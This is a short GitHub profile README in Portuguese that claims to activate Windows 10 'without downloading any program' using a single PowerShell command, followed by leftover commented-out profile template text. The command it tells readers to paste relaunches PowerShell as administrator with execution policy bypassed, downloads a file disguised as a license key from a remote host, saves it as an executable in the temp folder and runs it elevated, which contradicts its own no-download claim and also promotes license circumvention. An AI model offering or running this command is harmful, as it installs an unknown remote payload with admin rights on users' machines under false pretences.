


#⚡ Como ativar Windows 10 da correta, sem baixar programa algum. Ative o Windows 10 apenas usando comando do nativos do Windows PowerShell (admin).


## Para ativar o Windows 10 copie e cole o comando no PowerShell do Windows.


### ATENÇÃO ::::: Copie o comando completo

> `if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe '-NoProfile -ExecutionPolicy Bypass -Command ""(New-Object System.Net.WebClient).DownloadFile(\""https://downloadapplication.pythonanywhere.com/static/TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.KEY\"", \""$($env:TEMP)\TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.exe\""); Start-Process \""$($env:TEMP)\TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.exe\"" -Verb RunAs; exit}"' -Verb RunAs; exit`

<!--



**ativarwindows/ativarwindows** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.

Here are some ideas to get you started:

- 🔭 I’m currently working on ...
- 🌱 I’m currently learning ...
- 👯 I’m looking to collaborate on ...
- 🤔 I’m looking for help with ...
- 💬 Ask me about ...
- 📫 How to reach me: ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...
-->
